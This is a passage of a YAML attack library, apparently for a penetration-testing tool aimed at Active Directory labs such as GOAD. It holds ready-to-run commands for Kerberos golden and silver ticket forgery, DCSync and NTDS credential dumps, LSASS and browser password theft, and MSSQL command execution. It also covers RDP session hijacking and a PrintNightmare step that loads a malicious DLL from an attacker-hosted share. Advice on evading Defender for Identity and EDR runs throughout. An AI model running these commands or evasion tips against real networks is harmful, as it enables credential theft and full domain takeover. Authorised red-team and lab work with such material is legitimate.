      - "Export hashcat results showing cracked passwords"
      - "Verify all cleanup steps completed"
      - "Write executive summary"

  - id: golden_ticket
    name: Golden Ticket — Kerberos TGT Forgery
    tab: Domain Dominance
    requires: [DOMAIN, KRBTGT_HASH, DOMAIN_SID, DC_IP]
    requires_priv: da
    tags: [golden-ticket, persistence, kerberos, krbtgt]
    description: >
      Forge a Kerberos TGT using the KRBTGT hash obtained via DCSync.
      Valid for any user, bypasses password changes, and persists even after
      the target account's password is reset (KRBTGT must be rotated twice).
    commands:
      - label: Forge golden ticket (impacket)
        cmd: "impacket-ticketer -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} administrator"
      - label: Use golden ticket
        cmd: "export KRB5CCNAME=./administrator.ccache && impacket-wmiexec -k -no-pass {DOMAIN}/administrator@{DC_IP}"
      - label: Golden ticket for specific service
        cmd: "impacket-ticketer -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn cifs/{TARGET_COMPUTER}.{DOMAIN} administrator"
      - label: Verify ticket is valid
        cmd: "klist"
    next_steps:
      - "Document ticket validity for client evidence"
      - "Access any resource in the domain"
      - "Demonstrate persistence beyond password reset"
    opsec: >
      Golden tickets don't touch the KDC for initial TGT request — no 4768.
      Ticket use generates normal service ticket requests (4769).
      Microsoft Defender for Identity detects KRBTGT encryption downgrade and
      anomalous ticket lifetime.  Keep ticket lifetime ≤10 hours to blend in.
    cleanup:
      - label: Remove ticket file
        cmd: "rm -f ./administrator.ccache"
      - label: Unset KRB5CCNAME
        cmd: "unset KRB5CCNAME"

  - id: silver_ticket
    name: Silver Ticket — Service Ticket Forgery
    tab: Domain Dominance
    requires: [DOMAIN, DOMAIN_SID, SERVICE_HASH, TARGET_COMPUTER, TARGET_SPN]
    requires_priv: null
    tags: [silver-ticket, persistence, kerberos, stealthy]
    description: >
      Forge a Kerberos TGS (service ticket) using the service account's NTLM
      hash. Does NOT contact the KDC — completely offline forgery.
      Extremely stealthy. Requires the service account's machine hash.
    commands:
      - label: Forge silver ticket (cifs)
        cmd: "impacket-ticketer -nthash {SERVICE_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn cifs/{TARGET_COMPUTER}.{DOMAIN} administrator"
      - label: Forge silver ticket (http — for WinRM/IIS)
        cmd: "impacket-ticketer -nthash {SERVICE_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn http/{TARGET_COMPUTER}.{DOMAIN} administrator"
      - label: Use silver ticket
        cmd: "export KRB5CCNAME=./administrator.ccache && impacket-smbclient -k -no-pass {DOMAIN}/administrator@{TARGET_COMPUTER}.{DOMAIN}"
    next_steps:
      - "Access the specific service the ticket is forged for"
      - "Pivot to additional services using machine hash"
      - "Combine with other persistence mechanisms"
    opsec: >
      Silver tickets never touch the KDC — no 4768 or 4769 on the DC.
      Only the target service sees the ticket presentation (4624 on target host).
      Nearly undetectable without endpoint monitoring.
    cleanup:
      - label: Remove ticket
        cmd: "rm -f ./administrator.ccache && unset KRB5CCNAME"

  - id: ad_recycle_bin
    name: AD Recycle Bin — Deleted Object Recovery
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [recycle-bin, recon, deleted-objects, forensics]
    description: >
      Recover deleted AD objects (user accounts, computer accounts, groups)
      from the Recycle Bin. Useful for finding old service accounts with
      weak passwords that may still have access via trusts or cached tokens.
    commands:
      - label: Check if Recycle Bin is enabled
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=msDS-RecycleBinOptionalFeature)' 'cn'"
      - label: List recently deleted objects
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(isDeleted=TRUE)' 'sAMAccountName whenChanged' --scope base --search-base 'CN=Deleted Objects,DC=corp,DC=local'"
      - label: Restore a deleted user (PowerShell)
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -X 'Restore-ADObject -Identity <ObjectGUID>'"
    next_steps:
      - "Review recovered accounts for weak passwords"
      - "Check if old service accounts have lingering permissions"
      - "Document for client — may indicate poor offboarding procedures"
    opsec: "Recycle Bin queries are LDAP reads — low noise. Object restoration generates 4720 (account created)."

  - id: dcsync_full
    name: DCSync — Full Domain Credential Dump
    tab: Domain Dominance
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
    requires_priv: da
    tags:
      - dcsync
      - ntds
      - all-hashes
      - da
    description: >
      Simulate DC replication to extract all domain credentials including
      KRBTGT hash (for golden tickets), all user NTLM hashes, and Kerberos keys.
      Final step of domain compromise.
    commands:
      - label: "DCSync — dump all hashes"
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc -outputfile /tmp/dc_dump"
      - label: "DCSync — KRBTGT only"
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc-user krbtgt"
      - label: "DCSync — with NTLM hash"
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}@{DC_IP} -hashes :{NTLM_HASH} -just-dc -outputfile /tmp/dc_dump"
      - label: "NetExec NTDS dump"
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --ntds"
    next:
      - Extract KRBTGT hash for golden ticket persistence
      - Create diamond/sapphire tickets for stealth
      - Enumerate cross-domain trusts for pivot
      - Document all recovered credentials for report
    opsec: >
      DCSync generates event 4662 with replication GUIDs. Detected by
      Microsoft ATA, Defender Identity, and most SIEMs.
    cleanup:
      - label: "Secure dump files"
        cmd: "chmod 600 /tmp/dc_dump* && mv /tmp/dc_dump* ~/loot/"

  - id: golden_ticket
    name: Golden Ticket — KRBTGT Persistence
    tab: Domain Dominance
    requires:
      - DC_IP
      - DOMAIN
      - DOMAIN_SID
      - KRBTGT_HASH
      - TARGET_USER
    requires_priv: da
    tags:
      - golden-ticket
      - persistence
      - krbtgt
      - da
    description: >
      Forge a Golden Ticket using the KRBTGT hash. Valid for 10+ years by
      default. Survives domain password changes (until KRBTGT is rotated twice).
      The ultimate persistence mechanism — survives DA password resets.
    commands:
      - label: "Forge golden ticket with impacket"
        cmd: "impacket-ticketer -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -groups 512,518,519,520 {TARGET_USER}"
      - label: "Use golden ticket"
        cmd: "export KRB5CCNAME=./{TARGET_USER}.ccache && impacket-secretsdump -k -no-pass {DOMAIN}/{TARGET_USER}@{DC_IP}"
      - label: "DCSync with golden ticket"
        cmd: "export KRB5CCNAME=./{TARGET_USER}.ccache && impacket-secretsdump -k -no-pass {DC_IP}"
      - label: "Get DOMAIN_SID (needed for ticket)"
        cmd: "impacket-getPac -targetUser administrator {DOMAIN}/{USERNAME}:'{PASSWORD}'"
    next:
      - Use golden ticket to access any resource in the domain
      - Pivot to other domains via trust paths
      - Document for report — demonstrates full domain compromise
    opsec: >
      Golden tickets using the old encryption (RC4) are detectable by modern
      EDR. Prefer AES256 keys for stealth. Use only for demonstration/report.
    cleanup:
      - label: "Remove ticket files"
        cmd: "rm -f ./{TARGET_USER}.ccache"

  - id: cross_domain_trust
    name: Cross-Domain Trust Attack
    tab: Domain Dominance
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - NTLM_HASH
      - DOMAIN_SID
      - KRBTGT_HASH
    requires_priv: da
    tags:
      - trust
      - cross-domain
      - inter-realm
      - da
    description: >
      Pivot from one GOAD domain to another via inter-forest or inter-domain
      trusts. GOAD has bidirectional trusts between NORTH, ESSOS, and SEVENKINGDOMS.
      Forge inter-realm tickets to access resources in trusted domains.
    commands:
      - label: "Enumerate domain trusts"
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}@{DC_IP} -hashes :{NTLM_HASH} -just-dc-ntlm | grep -i trust"
      - label: "Get trust key via secretsdump"
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}@{DC_IP} -hashes :{NTLM_HASH} -just-dc"
      - label: "Forge inter-realm TGT (cross-domain golden ticket)"
        cmd: "impacket-ticketer -nthash <TRUST_KEY> -domain-sid {DOMAIN_SID} -domain {DOMAIN} -extra-sid <TARGET_DOMAIN_SID>-519 -spn krbtgt/<TARGET_DOMAIN> administrator"
      - label: "Use ticket to access target domain DC"
        cmd: "export KRB5CCNAME=./administrator.ccache && impacket-secretsdump -k -no-pass administrator@<TARGET_DC_FQDN>"
      - label: "Enumerate trusts with NetExec"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -H {NTLM_HASH} -M enum_trusts"
    next:
      - DCSync target domain for all credentials
      - Create golden ticket in target domain
      - Document cross-domain compromise chain
    opsec: >
      Cross-domain ticket forging is detectable by Defender Identity across
      both domains. Use quickly and document for report.
    cleanup:
      - label: "Remove ticket files"
        cmd: "rm -f ./administrator.ccache"

  - id: badsuccessor
    name: BadSuccessor — dMSA Privilege Escalation (2025)
    tab: Privilege Escalation
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - TARGET_USER
    requires_priv: null
    tags:
      - badsuccessor
      - dmsa
      - privesc
      - 2025
    description: >
      BadSuccessor (2025): Abuse delegated Managed Service Account (dMSA)
      migration to impersonate any account including DA. Any user with
      CreateChild over an OU can create a dMSA and set PrincipalsAllowedToSupersede
      to any target account, inheriting their full privileges.
    commands:
      - label: "Check if environment is vulnerable (Server 2025 DC)"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M badsuccessor"
      - label: "Create malicious dMSA targeting DA account"
        cmd: "python3 badsuccessor.py -d {DOMAIN} -u {USERNAME} -p '{PASSWORD}' -dc-ip {DC_IP} --target {TARGET_USER} --ou 'OU=Computers,DC=domain,DC=local'"
      - label: "Authenticate as dMSA to inherit target privileges"
        cmd: "python3 badsuccessor.py -d {DOMAIN} -u {USERNAME} -p '{PASSWORD}' -dc-ip {DC_IP} --auth"
    next:
      - Use inherited DA privileges for DCSync
      - Dump all domain credentials
    opsec: >
      Creates a dMSA object in AD (logged as 4741). Requires Server 2025 DC
      with no patch applied. Very new technique — limited detection coverage.
    cleanup:
      - label: "Delete created dMSA object"
        cmd: "impacket-ldap3 {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -delete 'CN=maliciousdmsa,OU=...'"

  - id: machine_account_quota
    name: Machine Account Quota Abuse
    tab: Privilege Escalation
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
    requires_priv: null
    tags:
      - maq
      - computer-account
      - rbcd
      - privesc
    description: >
      Check and abuse the Machine Account Quota (default=10). Any domain user
      can create up to 10 computer accounts. Used as a prerequisite for
      NoPac, RBCD attacks, and ESC1 enrollment. Always check this first.
    commands:
      - label: "Check Machine Account Quota"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M maq"
      - label: "Check via impacket"
        cmd: "impacket-ldap3 {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -search '(objectClass=domain)' -attr ms-DS-MachineAccountQuota"
      - label: "Create computer account for attack prerequisite"
        cmd: "impacket-addcomputer {DOMAIN}/{USERNAME}:'{PASSWORD}' -computer-name 'ATTACKPC$' -computer-pass 'AttackPass123!' -dc-ip {DC_IP}"
      - label: "Verify computer account was created"
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --computers"
    next:
      - Use created computer for RBCD attack
      - Use created computer for NoPac (SamAccountName spoofing)
      - Add SPN to created computer for Kerberoast
    opsec: >
      Computer creation generates event 4741. Detectable by EDR. The created
      computer will show in AD — clean up after the attack.
    cleanup:
      - label: "Delete created computer account"
        cmd: "impacket-addcomputer {DOMAIN}/{USERNAME}:'{PASSWORD}' -computer-name 'ATTACKPC$' -delete -dc-ip {DC_IP}"

# ═══════════════════════════════════════════════════════════════════════
# AD▸PWN Custom Attacks — YAML Import Format
# Load via the "⚡ Load Attacks" button in the top nav bar.
#
# Each attack is added to the sidebar under the tab you specify.
# Placeholder tokens like {DC_IP} are auto-filled from the Creds tab
# exactly like the built-in attacks.
#
# tab options (must match exactly):
#   Enumeration | Credential Attacks | Lateral Movement
#   Privilege Escalation | ADCS | Domain Dominance
#
# requires_priv options: null | "local_admin" | "da"
# ═══════════════════════════════════════════════════════════════════════

  # ════════════════════════════════
  # ENUMERATION
  # ════════════════════════════════

  - id: sccm_discovery
    name: SCCM / ConfigMgr Discovery
    tab: Enumeration
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: null
    tags: [sccm, enum, mssql, lateral]
    description: >
      Enumerate SCCM/ConfigMgr infrastructure. SCCM often holds credentials,
      deployment packages, scripts, and admin access across the entire fleet.
    commands:
      - label: Find SCCM servers via LDAP
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=mSSMSManagementPoint)' 'dNSHostName'"
      - label: Find SCCM via DNS
        cmd: "nslookup -type=SRV _mssms-mp._tcp.{DOMAIN} {DC_IP}"
      - label: SharpSCCM — enumerate site
        cmd: "SharpSCCM.exe get site-info -sms {TARGET_IP}"
      - label: SharpSCCM — enumerate admins
        cmd: "SharpSCCM.exe get class-instances SMS_Admin -sms {TARGET_IP}"
      - label: SharpSCCM — NAA credentials (Network Access Account)
        cmd: "SharpSCCM.exe get naa -sms {TARGET_IP}"
      - label: SCCM MSSQL — check DB access
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q 'SELECT name FROM sys.databases'"
    next_steps:
      - "Extract NAA credentials from SCCM"
      - "Check SCCM admin console access"
      - "Enumerate client push installation accounts"
      - "Look for scripts/packages containing credentials"
    opsec: >
      LDAP queries are logged. SharpSCCM connections appear as normal admin
      traffic on the SCCM server. MSSQL queries are logged in SQL error logs.
    cleanup:
      - label: Remove SharpSCCM binary
        cmd: "del /f {TARGET_COMPUTER}\\C$\\Windows\\Temp\\SharpSCCM.exe"

  - id: mssql_enum
    name: MSSQL Enumeration & Exploitation
    tab: Enumeration
    requires: [DOMAIN, USERNAME, PASSWORD, DC_IP]
    requires_priv: null
    tags: [mssql, enum, rce, lateral]
    description: >
      Discover and exploit MSSQL instances. Linked servers, xp_cmdshell,
      and impersonation are common escalation paths.
    commands:
      - label: Discover MSSQL instances
        cmd: "nxc mssql {SUBNET} -u {USERNAME} -p '{PASSWORD}'"
      - label: Check sysadmin privilege
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q 'SELECT IS_SRVROLEMEMBER(''sysadmin'')'"
      - label: Enable xp_cmdshell (requires sysadmin)
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q \"EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE\""
      - label: Execute command via xp_cmdshell
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami'"
      - label: Enumerate linked servers
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q 'SELECT name,data_source FROM sys.servers'"
      - label: Impersonate another login
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q \"EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER\""
    next_steps:
      - "Execute commands via xp_cmdshell"
      - "Pivot via linked servers"
      - "Extract MSSQL service account hash for cracking"
    opsec: "xp_cmdshell calls are logged. Impersonation and linked server hops appear in SQL audit logs if enabled."
    cleanup:
      - label: Disable xp_cmdshell
        cmd: "EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;"

  - id: nxc_lsassy
    name: LSASSY — In-Memory Credential Dump
    tab: Credential Attacks
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [dump, lsass, av-evasion, memory]
    description: >
      Dump LSASS using lsassy which tries multiple methods (procdump, nanodump,
      comsvcs, etc.) to evade AV/EDR. Less noisy than raw mimikatz.
    commands:
      - label: LSASSY via nxc module
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M lsassy"
      - label: LSASSY — scan entire subnet
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' -M lsassy --continue-on-success"
      - label: LSASSY standalone
        cmd: "lsassy -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {TARGET_IP}"
      - label: LSASSY with hash
        cmd: "lsassy -u {USERNAME} -H {NTLM_HASH} -d {DOMAIN} {TARGET_IP}"
    next_steps:
      - "Promote harvested credentials in Creds tab"
      - "Use admin hashes for PTH across subnet"
      - "Check for DA tokens in memory"
    opsec: "Lsassy uses multiple evasion methods but LSASS access is still logged (Event 4656). Some EDRs detect all LSASS reads."

  - id: nxc_dpapi
    name: DPAPI — Browser & Credential Manager Dump
    tab: Credential Attacks
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [dpapi, browser, creds, cleartext]
    description: >
      Dump DPAPI-protected secrets: browser saved passwords (Chrome, Edge,
      Firefox), Windows Credential Manager, and DPAPI master keys.
    commands:
      - label: DPAPI module (all)
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M dpapi"
      - label: Chrome passwords
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M dpapi --options CHROME=True"
      - label: Credential Manager
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M dpapi --options CREDMAN=True"
      - label: Impacket dpapimodule
        cmd: "impacket-dpapi masterkey -file '/path/to/masterkey' -password '{PASSWORD}'"
    next_steps:
      - "Review browser saved passwords for admin credentials"
      - "Check Credential Manager for VPN / RDP credentials"
    opsec: "Remote DPAPI access requires file reads from the user profile — generates 4663 events."

  - id: nxc_ntdsutil
    name: NTDS via NTDSUtil / VSS (Shadow Copy)
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [ntds, vss, shadowcopy, dump, stealthy]
    description: >
      Extract NTDS.dit via Volume Shadow Copy (VSS). Avoids the DRSUAPI
      replication method used by secretsdump — significantly stealthier
      against Microsoft Defender for Identity.
    commands:
      - label: NXC NTDS via VSS
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --ntds vss"
      - label: Secretsdump with VSS flag
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -use-vss -outputfile /tmp/ntds_vss"
      - label: Manual VSS via NXC exec
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -x 'ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\vss_dump\" q q'"
      - label: Retrieve dumped files
        cmd: "impacket-smbclient {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -c 'get C:\\vss_dump\\Active Directory\\ntds.dit'"
    next_steps:
      - "Extract KRBTGT hash"
      - "Crack high-value account hashes offline"
      - "Document all extracted hashes for report"
    opsec: >
      VSS creation generates System event 7036 and Security event 4985.
      Stealthier than DCSync (no 4662 replication events) but VSS creation
      is still visible in event logs.
    cleanup:
      - label: Delete VSS dump folder
        cmd: "rmdir /s /q C:\\vss_dump"
      - label: Delete shadow copy (if created)
        cmd: "vssadmin delete shadows /for=C: /quiet"

  # ════════════════════════════════
  # LATERAL MOVEMENT
  # ════════════════════════════════

  - id: wmiexec_lateral
    name: WMIExec — Quiet Lateral Movement
    tab: Lateral Movement
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [lateral, wmi, exec, quiet]
    description: >
      Remote command execution via WMI. No service created — quieter than
      PSExec. Supports password and NTLM hash authentication.
    commands:
      - label: WMIExec (password)
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: WMIExec (hash PTH)
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: WMIExec (Kerberos ticket)
        cmd: "impacket-wmiexec -k -no-pass {DOMAIN}/{USERNAME}@{TARGET_IP}"
      - label: Single command execution
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'whoami /all'"
      - label: NXC WMI exec
        cmd: "nxc wmi {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami'"
    next_steps:
      - "Dump credentials from memory"
      - "Enumerate local admin groups"
      - "Check for interesting files and credentials"
    opsec: "WMI process creation logged (Event 4688 with WMI host). Stealthier than PSExec — no service creation."

  - id: rdp_hijack
    name: RDP Session Hijacking (Local Admin)
    tab: Lateral Movement
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN, TARGET_USER]
    requires_priv: local_admin
    tags: [rdp, session, hijack, lateral, noisy]
    description: >
      Hijack an existing RDP session belonging to another user using the
      tscon technique. Requires SYSTEM privileges (escalate via local admin).
      Useful for taking over a DA session without knowing their password.
    commands:
      - label: List active RDP sessions
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'query session'"
      - label: Escalate to SYSTEM via PsExec
        cmd: "psexec -s -i cmd.exe"
      - label: Hijack target session (run as SYSTEM)
        cmd: "tscon <SESSION_ID> /dest:console"
      - label: Alternative — create a service for tscon
        cmd: "sc create rdphijack binpath= \"cmd /c tscon <SESSION_ID> /dest:console\" && sc start rdphijack"
    next_steps:
      - "Pivot using the hijacked session context"
      - "Extract credentials from hijacked user's session"
      - "Run BloodHound as the hijacked user"
    opsec: "Session hijacking logs event 4778 (session reconnect). Victim user sees their session disconnect."
    cleanup:
      - label: Remove service if created
        cmd: "sc stop rdphijack && sc delete rdphijack"

  # ════════════════════════════════
  # PRIVILEGE ESCALATION
  # ════════════════════════════════

  - id: gmsa_abuse
    name: Group Managed Service Account (gMSA) Abuse
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: null
    tags: [gmsa, service-account, privesc, lateral]
    description: >
      Group Managed Service Accounts have their passwords automatically managed
      by AD. If a compromised account has ReadGMSAPassword rights, the gMSA
      password hash can be extracted and used for PTH.
    commands:
      - label: Find gMSA accounts
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --gmsa"
      - label: Check who can read gMSA password
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=msDS-GroupManagedServiceAccount)' 'sAMAccountName msDS-ManagedPasswordID'"
      - label: Read gMSA password (if permitted)
        cmd: "python3 gMSADumper.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {DC_IP}"
      - label: PTH with gMSA hash
        cmd: "nxc smb {SUBNET} -u '<GMSA_ACCOUNT>$' -H '<GMSA_HASH>' --continue-on-success"
    next_steps:
      - "Use gMSA hash for PTH"
      - "Check gMSA permissions in BloodHound"
      - "Enumerate what the gMSA account has access to"
    opsec: "gMSA password reads are logged. Check if the gMSA is monitored by ATA/MDI."

  - id: pxethief_auth
    name: PXEThief — Authenticated PXE Credential Theft
    tab: Privilege Escalation
    requires: [TARGET_IP, USERNAME, PASSWORD]
    requires_priv: local_admin
    tags: [pxe, sccm, creds, registry, stealthy]
    description: >
      Extract the PXE boot password directly from the SCCM Distribution Point
      registry. Requires local admin on the DP server. Password is stored
      encrypted in the registry and can be decrypted with PXEThief.
    commands:
      - label: Read PXE password from DP registry
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'reg query HKLM\\software\\microsoft\\sms\\dp /v Reserved1'"
      - label: PXEThief — decrypt from variables file
        cmd: "python3 pxethief.py 5 variables.var"
      - label: PXEThief — crack hash with hashcat
        cmd: "hashcat -m 19850 pxe_hash.txt /usr/share/wordlists/rockyou.txt"
      - label: PXEThief — unauthenticated (network position)
        cmd: "python3 pxethief.py 1"
    next_steps:
      - "Use PXE password to boot and access task sequences"
      - "Extract credentials from SCCM task sequences"
      - "Check SCCM NAA (Network Access Account) credentials"
    opsec: "Registry reads appear as normal admin activity. PXE TFTP requests are logged on the DP."

  - id: print_nightmare
    name: PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
    tab: Privilege Escalation
    requires: [TARGET_IP, ATTACKER_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: null
    tags: [printnightmare, cve, privesc, rce, critical]
    description: >
      Abuse the Windows Print Spooler service to load a malicious DLL and
      escalate to SYSTEM (local) or achieve remote code execution (remote).
      Check patching status before attempting.
    commands:
      - label: Check if Spooler is running
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M spooler"
      - label: Check patch level
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'wmic qfe get hotfixid | findstr KB5004945 KB5004946'"
      - label: PrintNightmare — add local admin (Python)
        cmd: "python3 CVE-2021-1675.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} '\\\\{ATTACKER_IP}\\share\\evil.dll'"
      - label: Host malicious DLL share
        cmd: "impacket-smbserver share /tmp/payload -smb2support"
      - label: Cube0x0 — remote via named pipe
